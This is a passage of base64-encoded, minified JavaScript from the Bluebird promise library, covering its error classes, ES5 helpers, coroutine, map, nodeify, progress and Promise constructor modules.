WxhciBBZ2dyZWdhdGVFcnJvcl0iOnRoaXNbbl0rIiIsaT1yLnNwbGl0KCJcbiIpLHM9MDtzPGkubGVuZ3RoOysrcylpW3NdPWUraVtzXTtyPWkuam9pbigiXG4iKSx0Kz1yKyJcbiJ9cmV0dXJuIHYtLSx0fSxsKGksRXJyb3IpO3ZhciBiPUVycm9yLl9fQmx1ZWJpcmRFcnJvclR5cGVzX187Ynx8KGI9dSh7Q2FuY2VsbGF0aW9uRXJyb3I6ZixUaW1lb3V0RXJyb3I6cCxPcGVyYXRpb25hbEVycm9yOmksUmVqZWN0aW9uRXJyb3I6aSxBZ2dyZWdhdGVFcnJvcjpffSksZChFcnJvciwiX19CbHVlYmlyZEVycm9yVHlwZXNfXyIsYikpLHQuZXhwb3J0cz17RXJyb3I6RXJyb3IsVHlwZUVycm9yOnMsUmFuZ2VFcnJvcjpvLENhbmNlbGxhdGlvbkVycm9yOmIuQ2FuY2VsbGF0aW9uRXJyb3IsT3BlcmF0aW9uYWxFcnJvcjpiLk9wZXJhdGlvbmFsRXJyb3IsVGltZW91dEVycm9yOmIuVGltZW91dEVycm9yLEFnZ3JlZ2F0ZUVycm9yOmIuQWdncmVnYXRlRXJyb3IsV2FybmluZzpofX0seyIuL2VzNS5qcyI6MTQsIi4vdXRpbC5qcyI6Mzh9XSwxNDpbZnVuY3Rpb24oZSx0LG4pe3ZhciByPWZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO3JldHVybiB2b2lkIDA9PT10aGlzfSgpO2lmKHIpdC5leHBvcnRzPXtmcmVlemU6T2JqZWN0LmZyZWV6ZSxkZWZpbmVQcm9wZXJ0eTpPYmplY3QuZGVmaW5lUHJvcGVydHksZ2V0RGVzY3JpcHRvcjpPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yLGtleXM6T2JqZWN0LmtleXMsbmFtZXM6T2JqZWN0LmdldE93blByb3BlcnR5TmFtZXMsZ2V0UHJvdG90eXBlT2Y6T2JqZWN0LmdldFByb3RvdHlwZU9mLGlzQXJyYXk6QXJyYXkuaXNBcnJheSxpc0VTNTpyLHByb3BlcnR5SXNXcml0YWJsZTpmdW5jdGlvbihlLHQpe3ZhciBuPU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoZSx0KTtyZXR1cm4hKG4mJiFuLndyaXRhYmxlJiYhbi5zZXQpfX07ZWxzZXt2YXIgaT17fS5oYXNPd25Qcm9wZXJ0eSxzPXt9LnRvU3RyaW5nLG89e30uY29uc3RydWN0b3IucHJvdG90eXBlLGE9ZnVuY3Rpb24oZSl7dmFyIHQ9W107Zm9yKHZhciBuIGluIGUpaS5jYWxsKGUsbikmJnQucHVzaChuKTtyZXR1cm4gdH0sdT1mdW5jdGlvbihlLHQpe3JldHVybnt2YWx1ZTplW3RdfX0sYz1mdW5jdGlvbihlLHQsbil7cmV0dXJuIGVbdF09bi52YWx1ZSxlfSxsPWZ1bmN0aW9uKGUpe3JldHVybiBlfSxkPWZ1bmN0aW9uKGUpe3RyeXtyZXR1cm4gT2JqZWN0KGUpLmNvbnN0cnVjdG9yLnByb3RvdHlwZX1jYXRjaCh0KXtyZXR1cm4gb319LGg9ZnVuY3Rpb24oZSl7dHJ5e3JldHVybiJbb2JqZWN0IEFycmF5XSI9PT1zLmNhbGwoZSl9Y2F0Y2godCl7cmV0dXJuITF9fTt0LmV4cG9ydHM9e2lzQXJyYXk6aCxrZXlzOmEsbmFtZXM6YSxkZWZpbmVQcm9wZXJ0eTpjLGdldERlc2NyaXB0b3I6dSxmcmVlemU6bCxnZXRQcm90b3R5cGVPZjpkLGlzRVM1OnIscHJvcGVydHlJc1dyaXRhYmxlOmZ1bmN0aW9uKCl7cmV0dXJuITB9fX19LHt9XSwxNTpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0Ijt0LmV4cG9ydHM9ZnVuY3Rpb24oZSx0KXt2YXIgbj1lLm1hcDtlLnByb3RvdHlwZS5maWx0ZXI9ZnVuY3Rpb24oZSxyKXtyZXR1cm4gbih0aGlzLGUscix0KX0sZS5maWx0ZXI9ZnVuY3Rpb24oZSxyLGkpe3JldHVybiBuKGUscixpLHQpfX19LHt9XSwxNjpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0Ijt0LmV4cG9ydHM9ZnVuY3Rpb24odCxuLHIpe2Z1bmN0aW9uIGkoKXtyZXR1cm4gdGhpc31mdW5jdGlvbiBzKCl7dGhyb3cgdGhpc31mdW5jdGlvbiBvKGUpe3JldHVybiBmdW5jdGlvbigpe3JldHVybiBlfX1mdW5jdGlvbiBhKGUpe3JldHVybiBmdW5jdGlvbigpe3Rocm93IGV9fWZ1bmN0aW9uIHUoZSx0LG4pe3ZhciByO3JldHVybiByPWgodCk/bj9vKHQpOmEodCk6bj9pOnMsZS5fdGhlbihyLGYsdm9pZCAwLHQsdm9pZCAwKX1mdW5jdGlvbiBjKGUpe3ZhciBpPXRoaXMucHJvbWlzZSxzPXRoaXMuaGFuZGxlcixvPWkuX2lzQm91bmQoKT9zLmNhbGwoaS5fYm91bmRWYWx1ZSgpKTpzKCk7aWYodm9pZCAwIT09byl7dmFyIGE9cihvLGkpO2lmKGEgaW5zdGFuY2VvZiB0KXJldHVybiBhPWEuX3RhcmdldCgpLHUoYSxlLGkuaXNGdWxmaWxsZWQoKSl9cmV0dXJuIGkuaXNSZWplY3RlZCgpPyhuLmU9ZSxuKTplfWZ1bmN0aW9uIGwoZSl7dmFyIG49dGhpcy5wcm9taXNlLGk9dGhpcy5oYW5kbGVyLHM9bi5faXNCb3VuZCgpP2kuY2FsbChuLl9ib3VuZFZhbHVlKCksZSk6aShlKTtpZih2b2lkIDAhPT1zKXt2YXIgbz1yKHMsbik7aWYobyBpbnN0YW5jZW9mIHQpcmV0dXJuIG89by5fdGFyZ2V0KCksdShvLGUsITApfXJldHVybiBlfXZhciBkPWUoIi4vdXRpbC5qcyIpLGg9ZC5pc1ByaW1pdGl2ZSxmPWQudGhyb3dlcjt0LnByb3RvdHlwZS5fcGFzc1Rocm91Z2hIYW5kbGVyPWZ1bmN0aW9uKGUsdCl7aWYoImZ1bmN0aW9uIiE9dHlwZW9mIGUpcmV0dXJuIHRoaXMudGhlbigpO3ZhciBuPXtwcm9taXNlOnRoaXMsaGFuZGxlcjplfTtyZXR1cm4gdGhpcy5fdGhlbih0P2M6bCx0P2M6dm9pZCAwLHZvaWQgMCxuLHZvaWQgMCl9LHQucHJvdG90eXBlLmxhc3RseT10LnByb3RvdHlwZVsiZmluYWxseSJdPWZ1bmN0aW9uKGUpe3JldHVybiB0aGlzLl9wYXNzVGhyb3VnaEhhbmRsZXIoZSwhMCl9LHQucHJvdG90eXBlLnRhcD1mdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5fcGFzc1Rocm91Z2hIYW5kbGVyKGUsITEpfX19LHsiLi91dGlsLmpzIjozOH1dLDE3OltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO3QuZXhwb3J0cz1mdW5jdGlvbih0LG4scixpKXtmdW5jdGlvbiBzKGUsbixyKXtmb3IodmFyIHM9MDtzPG4ubGVuZ3RoOysrcyl7ci5fcHVzaENvbnRleHQoKTt2YXIgbz1kKG5bc10pKGUpO2lmKHIuX3BvcENvbnRleHQoKSxvPT09bCl7ci5fcHVzaENvbnRleHQoKTt2YXIgYT10LnJlamVjdChsLmUpO3JldHVybiByLl9wb3BDb250ZXh0KCksYX12YXIgdT1pKG8scik7aWYodSBpbnN0YW5jZW9mIHQpcmV0dXJuIHV9cmV0dXJuIG51bGx9ZnVuY3Rpb24gbyhlLG4saSxzKXt2YXIgbz10aGlzLl9wcm9taXNlPW5ldyB0KHIpO28uX2NhcHR1cmVTdGFja1RyYWNlKCksdGhpcy5fc3RhY2s9cyx0aGlzLl9nZW5lcmF0b3JGdW5jdGlvbj1lLHRoaXMuX3JlY2VpdmVyPW4sdGhpcy5fZ2VuZXJhdG9yPXZvaWQgMCx0aGlzLl95aWVsZEhhbmRsZXJzPSJmdW5jdGlvbiI9PXR5cGVvZiBpP1tpXS5jb25jYXQoaCk6aH12YXIgYT1lKCIuL2Vycm9ycy5qcyIpLHU9YS5UeXBlRXJyb3IsYz1lKCIuL3V0aWwuanMiKSxsPWMuZXJyb3JPYmosZD1jLnRyeUNhdGNoLGg9W107by5wcm90b3R5cGUucHJvbWlzZT1mdW5jdGlvbigpe3JldHVybiB0aGlzLl9wcm9taXNlfSxvLnByb3RvdHlwZS5fcnVuPWZ1bmN0aW9uKCl7dGhpcy5fZ2VuZXJhdG9yPXRoaXMuX2dlbmVyYXRvckZ1bmN0aW9uLmNhbGwodGhpcy5fcmVjZWl2ZXIpLHRoaXMuX3JlY2VpdmVyPXRoaXMuX2dlbmVyYXRvckZ1bmN0aW9uPXZvaWQgMCx0aGlzLl9uZXh0KHZvaWQgMCl9LG8ucHJvdG90eXBlLl9jb250aW51ZT1mdW5jdGlvbihlKXtpZihlPT09bClyZXR1cm4gdGhpcy5fcHJvbWlzZS5fcmVqZWN0Q2FsbGJhY2soZS5lLCExLCEwKTt2YXIgbj1lLnZhbHVlO2lmKGUuZG9uZT09PSEwKXRoaXMuX3Byb21pc2UuX3Jlc29sdmVDYWxsYmFjayhuKTtlbHNle3ZhciByPWkobix0aGlzLl9wcm9taXNlKTtpZighKHIgaW5zdGFuY2VvZiB0KSYmKHI9cyhyLHRoaXMuX3lpZWxkSGFuZGxlcnMsdGhpcy5fcHJvbWlzZSksbnVsbD09PXIpKXJldHVybiB2b2lkIHRoaXMuX3Rocm93KG5ldyB1KCJBIHZhbHVlICVzIHdhcyB5aWVsZGVkIHRoYXQgY291bGQgbm90IGJlIHRyZWF0ZWQgYXMgYSBwcm9taXNlXG5cbiAgICBTZWUgaHR0cDovL2dvby5nbC80WTRwRGtcblxuIi5yZXBsYWNlKCIlcyIsbikrIkZyb20gY29yb3V0aW5lOlxuIit0aGlzLl9zdGFjay5zcGxpdCgiXG4iKS5zbGljZSgxLC03KS5qb2luKCJcbiIpKSk7ci5fdGhlbih0aGlzLl9uZXh0LHRoaXMuX3Rocm93LHZvaWQgMCx0aGlzLG51bGwpfX0sby5wcm90b3R5cGUuX3Rocm93PWZ1bmN0aW9uKGUpe3RoaXMuX3Byb21pc2UuX2F0dGFjaEV4dHJhVHJhY2UoZSksdGhpcy5fcHJvbWlzZS5fcHVzaENvbnRleHQoKTt2YXIgdD1kKHRoaXMuX2dlbmVyYXRvclsidGhyb3ciXSkuY2FsbCh0aGlzLl9nZW5lcmF0b3IsZSk7dGhpcy5fcHJvbWlzZS5fcG9wQ29udGV4dCgpLHRoaXMuX2NvbnRpbnVlKHQpfSxvLnByb3RvdHlwZS5fbmV4dD1mdW5jdGlvbihlKXt0aGlzLl9wcm9taXNlLl9wdXNoQ29udGV4dCgpO3ZhciB0PWQodGhpcy5fZ2VuZXJhdG9yLm5leHQpLmNhbGwodGhpcy5fZ2VuZXJhdG9yLGUpO3RoaXMuX3Byb21pc2UuX3BvcENvbnRleHQoKSx0aGlzLl9jb250aW51ZSh0KX0sdC5jb3JvdXRpbmU9ZnVuY3Rpb24oZSx0KXtpZigiZnVuY3Rpb24iIT10eXBlb2YgZSl0aHJvdyBuZXcgdSgiZ2VuZXJhdG9yRnVuY3Rpb24gbXVzdCBiZSBhIGZ1bmN0aW9uXG5cbiAgICBTZWUgaHR0cDovL2dvby5nbC82VnFobTBcbiIpO3ZhciBuPU9iamVjdCh0KS55aWVsZEhhbmRsZXIscj1vLGk9KG5ldyBFcnJvcikuc3RhY2s7cmV0dXJuIGZ1bmN0aW9uKCl7dmFyIHQ9ZS5hcHBseSh0aGlzLGFyZ3VtZW50cykscz1uZXcgcih2b2lkIDAsdm9pZCAwLG4saSk7cmV0dXJuIHMuX2dlbmVyYXRvcj10LHMuX25leHQodm9pZCAwKSxzLnByb21pc2UoKX19LHQuY29yb3V0aW5lLmFkZFlpZWxkSGFuZGxlcj1mdW5jdGlvbihlKXtpZigiZnVuY3Rpb24iIT10eXBlb2YgZSl0aHJvdyBuZXcgdSgiZm4gbXVzdCBiZSBhIGZ1bmN0aW9uXG5cbiAgICBTZWUgaHR0cDovL2dvby5nbC85MTZsSkpcbiIpO2gucHVzaChlKX0sdC5zcGF3bj1mdW5jdGlvbihlKXtpZigiZnVuY3Rpb24iIT10eXBlb2YgZSlyZXR1cm4gbigiZ2VuZXJhdG9yRnVuY3Rpb24gbXVzdCBiZSBhIGZ1bmN0aW9uXG5cbiAgICBTZWUgaHR0cDovL2dvby5nbC82VnFobTBcbiIpO3ZhciByPW5ldyBvKGUsdGhpcyksaT1yLnByb21pc2UoKTtyZXR1cm4gci5fcnVuKHQuc3Bhd24pLGl9fX0seyIuL2Vycm9ycy5qcyI6MTMsIi4vdXRpbC5qcyI6Mzh9XSwxODpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0Ijt0LmV4cG9ydHM9ZnVuY3Rpb24odCxuLHIsaSl7dmFyIHM9ZSgiLi91dGlsLmpzIik7cy5jYW5FdmFsdWF0ZSxzLnRyeUNhdGNoLHMuZXJyb3JPYmo7dC5qb2luPWZ1bmN0aW9uKCl7dmFyIGUsdD1hcmd1bWVudHMubGVuZ3RoLTE7aWYodD4wJiYiZnVuY3Rpb24iPT10eXBlb2YgYXJndW1lbnRzW3RdKXtlPWFyZ3VtZW50c1t0XTt2YXIgcn1mb3IodmFyIGk9YXJndW1lbnRzLmxlbmd0aCxzPW5ldyBBcnJheShpKSxvPTA7aT5vOysrbylzW29dPWFyZ3VtZW50c1tvXTtlJiZzLnBvcCgpO3ZhciByPW5ldyBuKHMpLnByb21pc2UoKTtyZXR1cm4gdm9pZCAwIT09ZT9yLnNwcmVhZChlKTpyfX19LHsiLi91dGlsLmpzIjozOH1dLDE5OltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO3QuZXhwb3J0cz1mdW5jdGlvbih0LG4scixpLHMpe2Z1bmN0aW9uIG8oZSx0LG4scil7dGhpcy5jb25zdHJ1Y3RvciQoZSksdGhpcy5fcHJvbWlzZS5fY2FwdHVyZVN0YWNrVHJhY2UoKTt2YXIgaT1jKCk7dGhpcy5fY2FsbGJhY2s9bnVsbD09PWk/dDppLmJpbmQodCksdGhpcy5fcHJlc2VydmVkVmFsdWVzPXI9PT1zP25ldyBBcnJheSh0aGlzLmxlbmd0aCgpKTpudWxsLHRoaXMuX2xpbWl0PW4sdGhpcy5faW5GbGlnaHQ9MCx0aGlzLl9xdWV1ZT1uPj0xP1tdOl8sbC5pbnZva2UoYSx0aGlzLHZvaWQgMCl9ZnVuY3Rpb24gYSgpe3RoaXMuX2luaXQkKHZvaWQgMCwtMil9ZnVuY3Rpb24gdShlLHQsbixyKXt2YXIgaT0ib2JqZWN0Ij09dHlwZW9mIG4mJm51bGwhPT1uP24uY29uY3VycmVuY3k6MDtyZXR1cm4gaT0ibnVtYmVyIj09dHlwZW9mIGkmJmlzRmluaXRlKGkpJiZpPj0xP2k6MCxuZXcgbyhlLHQsaSxyKX12YXIgYz10Ll9nZXREb21haW4sbD1lKCIuL2FzeW5jLmpzIiksZD1lKCIuL3V0aWwuanMiKSxoPWQudHJ5Q2F0Y2gsZj1kLmVycm9yT2JqLHA9e30sXz1bXTtkLmluaGVyaXRzKG8sbiksby5wcm90b3R5cGUuX2luaXQ9ZnVuY3Rpb24oKXt9LG8ucHJvdG90eXBlLl9wcm9taXNlRnVsZmlsbGVkPWZ1bmN0aW9uKGUsbil7dmFyIHI9dGhpcy5fdmFsdWVzLHM9dGhpcy5sZW5ndGgoKSxvPXRoaXMuX3ByZXNlcnZlZFZhbHVlcyxhPXRoaXMuX2xpbWl0O2lmKHJbbl09PT1wKXtpZihyW25dPWUsYT49MSYmKHRoaXMuX2luRmxpZ2h0LS0sdGhpcy5fZHJhaW5RdWV1ZSgpLHRoaXMuX2lzUmVzb2x2ZWQoKSkpcmV0dXJufWVsc2V7aWYoYT49MSYmdGhpcy5faW5GbGlnaHQ+PWEpcmV0dXJuIHJbbl09ZSx2b2lkIHRoaXMuX3F1ZXVlLnB1c2gobik7bnVsbCE9PW8mJihvW25dPWUpO3ZhciB1PXRoaXMuX2NhbGxiYWNrLGM9dGhpcy5fcHJvbWlzZS5fYm91bmRWYWx1ZSgpO3RoaXMuX3Byb21pc2UuX3B1c2hDb250ZXh0KCk7dmFyIGw9aCh1KS5jYWxsKGMsZSxuLHMpO2lmKHRoaXMuX3Byb21pc2UuX3BvcENvbnRleHQoKSxsPT09ZilyZXR1cm4gdGhpcy5fcmVqZWN0KGwuZSk7dmFyIGQ9aShsLHRoaXMuX3Byb21pc2UpO2lmKGQgaW5zdGFuY2VvZiB0KXtpZihkPWQuX3RhcmdldCgpLGQuX2lzUGVuZGluZygpKXJldHVybiBhPj0xJiZ0aGlzLl9pbkZsaWdodCsrLHJbbl09cCxkLl9wcm94eVByb21pc2VBcnJheSh0aGlzLG4pO2lmKCFkLl9pc0Z1bGZpbGxlZCgpKXJldHVybiB0aGlzLl9yZWplY3QoZC5fcmVhc29uKCkpO2w9ZC5fdmFsdWUoKX1yW25dPWx9dmFyIF89Kyt0aGlzLl90b3RhbFJlc29sdmVkO18+PXMmJihudWxsIT09bz90aGlzLl9maWx0ZXIocixvKTp0aGlzLl9yZXNvbHZlKHIpKX0sby5wcm90b3R5cGUuX2RyYWluUXVldWU9ZnVuY3Rpb24oKXtmb3IodmFyIGU9dGhpcy5fcXVldWUsdD10aGlzLl9saW1pdCxuPXRoaXMuX3ZhbHVlcztlLmxlbmd0aD4wJiZ0aGlzLl9pbkZsaWdodDx0Oyl7aWYodGhpcy5faXNSZXNvbHZlZCgpKXJldHVybjt2YXIgcj1lLnBvcCgpO3RoaXMuX3Byb21pc2VGdWxmaWxsZWQobltyXSxyKX19LG8ucHJvdG90eXBlLl9maWx0ZXI9ZnVuY3Rpb24oZSx0KXtmb3IodmFyIG49dC5sZW5ndGgscj1uZXcgQXJyYXkobiksaT0wLHM9MDtuPnM7KytzKWVbc10mJihyW2krK109dFtzXSk7ci5sZW5ndGg9aSx0aGlzLl9yZXNvbHZlKHIpfSxvLnByb3RvdHlwZS5wcmVzZXJ2ZWRWYWx1ZXM9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5fcHJlc2VydmVkVmFsdWVzfSx0LnByb3RvdHlwZS5tYXA9ZnVuY3Rpb24oZSx0KXtyZXR1cm4iZnVuY3Rpb24iIT10eXBlb2YgZT9yKCJmbiBtdXN0IGJlIGEgZnVuY3Rpb25cblxuICAgIFNlZSBodHRwOi8vZ29vLmdsLzkxNmxKSlxuIik6dSh0aGlzLGUsdCxudWxsKS5wcm9taXNlKCl9LHQubWFwPWZ1bmN0aW9uKGUsdCxuLGkpe3JldHVybiJmdW5jdGlvbiIhPXR5cGVvZiB0P3IoImZuIG11c3QgYmUgYSBmdW5jdGlvblxuXG4gICAgU2VlIGh0dHA6Ly9nb28uZ2wvOTE2bEpKXG4iKTp1KGUsdCxuLGkpLnByb21pc2UoKX19fSx7Ii4vYXN5bmMuanMiOjIsIi4vdXRpbC5qcyI6Mzh9XSwyMDpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0Ijt0LmV4cG9ydHM9ZnVuY3Rpb24odCxuLHIsaSl7dmFyIHM9ZSgiLi91dGlsLmpzIiksbz1zLnRyeUNhdGNoO3QubWV0aG9kPWZ1bmN0aW9uKGUpe2lmKCJmdW5jdGlvbiIhPXR5cGVvZiBlKXRocm93IG5ldyB0LlR5cGVFcnJvcigiZm4gbXVzdCBiZSBhIGZ1bmN0aW9uXG5cbiAgICBTZWUgaHR0cDovL2dvby5nbC85MTZsSkpcbiIpO3JldHVybiBmdW5jdGlvbigpe3ZhciByPW5ldyB0KG4pO3IuX2NhcHR1cmVTdGFja1RyYWNlKCksci5fcHVzaENvbnRleHQoKTt2YXIgaT1vKGUpLmFwcGx5KHRoaXMsYXJndW1lbnRzKTtyZXR1cm4gci5fcG9wQ29udGV4dCgpLHIuX3Jlc29sdmVGcm9tU3luY1ZhbHVlKGkpLHJ9fSx0LmF0dGVtcHQ9dFsidHJ5Il09ZnVuY3Rpb24oZSxyLGEpe2lmKCJmdW5jdGlvbiIhPXR5cGVvZiBlKXJldHVybiBpKCJmbiBtdXN0IGJlIGEgZnVuY3Rpb25cblxuICAgIFNlZSBodHRwOi8vZ29vLmdsLzkxNmxKSlxuIik7dmFyIHU9bmV3IHQobik7dS5fY2FwdHVyZVN0YWNrVHJhY2UoKSx1Ll9wdXNoQ29udGV4dCgpO3ZhciBjPXMuaXNBcnJheShyKT9vKGUpLmFwcGx5KGEscik6byhlKS5jYWxsKGEscik7cmV0dXJuIHUuX3BvcENvbnRleHQoKSx1Ll9yZXNvbHZlRnJvbVN5bmNWYWx1ZShjKSx1fSx0LnByb3RvdHlwZS5fcmVzb2x2ZUZyb21TeW5jVmFsdWU9ZnVuY3Rpb24oZSl7ZT09PXMuZXJyb3JPYmo/dGhpcy5fcmVqZWN0Q2FsbGJhY2soZS5lLCExLCEwKTp0aGlzLl9yZXNvbHZlQ2FsbGJhY2soZSwhMCl9fX0seyIuL3V0aWwuanMiOjM4fV0sMjE6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7dC5leHBvcnRzPWZ1bmN0aW9uKHQpe2Z1bmN0aW9uIG4oZSx0KXt2YXIgbj10aGlzO2lmKCFzLmlzQXJyYXkoZSkpcmV0dXJuIHIuY2FsbChuLGUsdCk7dmFyIGk9YSh0KS5hcHBseShuLl9ib3VuZFZhbHVlKCksW251bGxdLmNvbmNhdChlKSk7aT09PXUmJm8udGhyb3dMYXRlcihpLmUpfWZ1bmN0aW9uIHIoZSx0KXt2YXIgbj10aGlzLHI9bi5fYm91bmRWYWx1ZSgpLGk9dm9pZCAwPT09ZT9hKHQpLmNhbGwocixudWxsKTphKHQpLmNhbGwocixudWxsLGUpO2k9PT11JiZvLnRocm93TGF0ZXIoaS5lKX1mdW5jdGlvbiBpKGUsdCl7dmFyIG49dGhpcztpZighZSl7dmFyIHI9bi5fdGFyZ2V0KCksaT1yLl9nZXRDYXJyaWVkU3RhY2tUcmFjZSgpO2kuY2F1c2U9ZSxlPWl9dmFyIHM9YSh0KS5jYWxsKG4uX2JvdW5kVmFsdWUoKSxlKTtzPT09dSYmby50aHJvd0xhdGVyKHMuZSl9dmFyIHM9ZSgiLi91dGlsLmpzIiksbz1lKCIuL2FzeW5jLmpzIiksYT1zLnRyeUNhdGNoLHU9cy5lcnJvck9iajt0LnByb3RvdHlwZS5hc0NhbGxiYWNrPXQucHJvdG90eXBlLm5vZGVpZnk9ZnVuY3Rpb24oZSx0KXtpZigiZnVuY3Rpb24iPT10eXBlb2YgZSl7dmFyIHM9cjt2b2lkIDAhPT10JiZPYmplY3QodCkuc3ByZWFkJiYocz1uKSx0aGlzLl90aGVuKHMsaSx2b2lkIDAsdGhpcyxlKX1yZXR1cm4gdGhpc319fSx7Ii4vYXN5bmMuanMiOjIsIi4vdXRpbC5qcyI6Mzh9XSwyMjpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0Ijt0LmV4cG9ydHM9ZnVuY3Rpb24odCxuKXt2YXIgcj1lKCIuL3V0aWwuanMiKSxpPWUoIi4vYXN5bmMuanMiKSxzPXIudHJ5Q2F0Y2gsbz1yLmVycm9yT2JqO3QucHJvdG90eXBlLnByb2dyZXNzZWQ9ZnVuY3Rpb24oZSl7cmV0dXJuIHRoaXMuX3RoZW4odm9pZCAwLHZvaWQgMCxlLHZvaWQgMCx2b2lkIDApfSx0LnByb3RvdHlwZS5fcHJvZ3Jlc3M9ZnVuY3Rpb24oZSl7dGhpcy5faXNGb2xsb3dpbmdPckZ1bGZpbGxlZE9yUmVqZWN0ZWQoKXx8dGhpcy5fdGFyZ2V0KCkuX3Byb2dyZXNzVW5jaGVja2VkKGUpfSx0LnByb3RvdHlwZS5fcHJvZ3Jlc3NIYW5kbGVyQXQ9ZnVuY3Rpb24oZSl7cmV0dXJuIDA9PT1lP3RoaXMuX3Byb2dyZXNzSGFuZGxlcjA6dGhpc1soZTw8MikrZS01KzJdfSx0LnByb3RvdHlwZS5fZG9Qcm9ncmVzc1dpdGg9ZnVuY3Rpb24oZSl7dmFyIG49ZS52YWx1ZSxpPWUuaGFuZGxlcixhPWUucHJvbWlzZSx1PWUucmVjZWl2ZXIsYz1zKGkpLmNhbGwodSxuKTtpZihjPT09byl7aWYobnVsbCE9Yy5lJiYiU3RvcFByb2dyZXNzUHJvcGFnYXRpb24iIT09Yy5lLm5hbWUpe3ZhciBsPXIuY2FuQXR0YWNoVHJhY2UoYy5lKT9jLmU6bmV3IEVycm9yKHIudG9TdHJpbmcoYy5lKSk7YS5fYXR0YWNoRXh0cmFUcmFjZShsKSxhLl9wcm9ncmVzcyhjLmUpfX1lbHNlIGMgaW5zdGFuY2VvZiB0P2MuX3RoZW4oYS5fcHJvZ3Jlc3MsbnVsbCxudWxsLGEsdm9pZCAwKTphLl9wcm9ncmVzcyhjKX0sdC5wcm90b3R5cGUuX3Byb2dyZXNzVW5jaGVja2VkPWZ1bmN0aW9uKGUpe2Zvcih2YXIgcj10aGlzLl9sZW5ndGgoKSxzPXRoaXMuX3Byb2dyZXNzLG89MDtyPm87bysrKXt2YXIgYT10aGlzLl9wcm9ncmVzc0hhbmRsZXJBdChvKSx1PXRoaXMuX3Byb21pc2VBdChvKTtpZih1IGluc3RhbmNlb2YgdCkiZnVuY3Rpb24iPT10eXBlb2YgYT9pLmludm9rZSh0aGlzLl9kb1Byb2dyZXNzV2l0aCx0aGlzLHtoYW5kbGVyOmEscHJvbWlzZTp1LHJlY2VpdmVyOnRoaXMuX3JlY2VpdmVyQXQobyksdmFsdWU6ZX0pOmkuaW52b2tlKHMsdSxlKTtlbHNle3ZhciBjPXRoaXMuX3JlY2VpdmVyQXQobyk7ImZ1bmN0aW9uIj09dHlwZW9mIGE/YS5jYWxsKGMsZSx1KTpjIGluc3RhbmNlb2YgbiYmIWMuX2lzUmVzb2x2ZWQoKSYmYy5fcHJvbWlzZVByb2dyZXNzZWQoZSx1KX19fX19LHsiLi9hc3luYy5qcyI6MiwiLi91dGlsLmpzIjozOH1dLDIzOltmdW5jdGlvbihlLG4scil7InVzZSBzdHJpY3QiO24uZXhwb3J0cz1mdW5jdGlvbigpe2Z1bmN0aW9uIG4oZSl7aWYoImZ1bmN0aW9uIiE9dHlwZW9mIGUpdGhyb3cgbmV3IGgoInRoZSBwcm9taXNlIGNvbnN0cnVjdG9yIHJlcXVpcmVzIGEgcmVzb2x2ZXIgZnVuY3Rpb25cblxuICAgIFNlZSBodHRwOi8vZ29vLmdsL0VDMjJZblxuIik7aWYodGhpcy5jb25zdHJ1Y3RvciE9PW4pdGhyb3cgbmV3IGgoInRoZSBwcm9taXNlIGNvbnN0cnVjdG9yIGNhbm5vdCBiZSBpbnZva2VkIGRpcmVjdGx5XG5cbiAgICBTZWUgaHR0cDovL2dvby5nbC9Lc0lsZ2VcbiIpO3RoaXMuX2JpdEZpZWxkPTAsdGhpcy5fZnVsZmlsbG1lbnRIYW5kbGVyMD12b2lkIDAsdGhpcy5fcmVqZWN0aW9uSGFuZGxlcjA9dm9pZCAwLHRoaXMuX3Byb2dyZXNzSGFuZGxlcjA9dm9pZCAwLHRoaXMuX3Byb21pc2UwPXZvaWQgMCx0aGlzLl9yZWNlaXZlcjA9dm9pZCAwLHRoaXMuX3NldHRsZWRWYWx1ZT12b2lkIDAsZSE9PWYmJnRoaXMuX3Jlc29sdmVGcm9tUmVzb2x2ZXIoZSl9ZnVuY3Rpb24gcihlKXt2YXIgdD1uZXcgbihmKTt0Ll9mdWxmaWxsbWVudEhhbmRsZXIwPWUsdC5fcmVqZWN0aW9uSGFuZGxlcjA9ZSx0Ll9wcm9ncmVzc0hhbmRsZXIwPWUsdC5fcHJvbWlzZTA9ZSx0Ll9yZWNlaXZlcjA9ZSx0Ll9zZXR0bGVkVmFsdWU9ZX12YXIgaSxzPWZ1bmN0aW9uKCl7cmV0dXJuIG5ldyBoKCJjaXJjdWxhciBwcm9taXNlIHJlc29sdXRpb24gY2hhaW5cblxuICAgIFNlZSBodHRwOi8vZ29vLmdsL0xoRnBvMFxuIil9LG89ZnVuY3Rpb24oKXtyZXR1cm4gbmV3IG4uUHJvbWlzZUluc3BlY3Rpb24odGhpcy5fdGFyZ2V0KCkpfSxhPWZ1bmN0aW9uKGUpe3JldHVybiBuLnJlamVjdChuZXcgaChlKSl9LHU9ZSgiLi91dGlsLmpzIik7aT11LmlzTm9kZT9mdW5jdGlvbigpe3ZhciBlPXQuZG9tYWluO3JldHVybiB2b2lkIDA9PT1lJiYoZT1udWxsKSxlfTpmdW5jdGlvbigpe3JldHVybiBudWxsfSx1Lm5vdEVudW1lcmFibGVQcm9wKG4sIl9nZXREb21haW4iLGkpO3ZhciBjPXt9LGw9ZSgiLi9hc3luYy5qcyIpLGQ9ZSgiLi9lcnJvcnMuanMiKSxoPW4uVHlwZUVycm9yPWQuVHlwZUVycm9yO24uUmFuZ2VFcnJvcj1kLlJhbmdlRXJyb3Isbi5DYW5jZWxsYXRpb25FcnJvcj1kLkNhbmNlbGxhdGlvbkVycm9yLG4uVGltZW91dEVycm9yPWQuVGltZW91dEVycm9yLG4uT3BlcmF0aW9uYWxFcnJvcj1kLk9wZXJhdGlvbmFsRXJyb3Isbi5SZWplY3Rpb25FcnJvcj1kLk9wZXJhdGlvbmFsRXJyb3Isbi5BZ2dyZWdhdGVFcnJvcj1kLkFnZ3JlZ2F0ZUVycm9yO3ZhciBm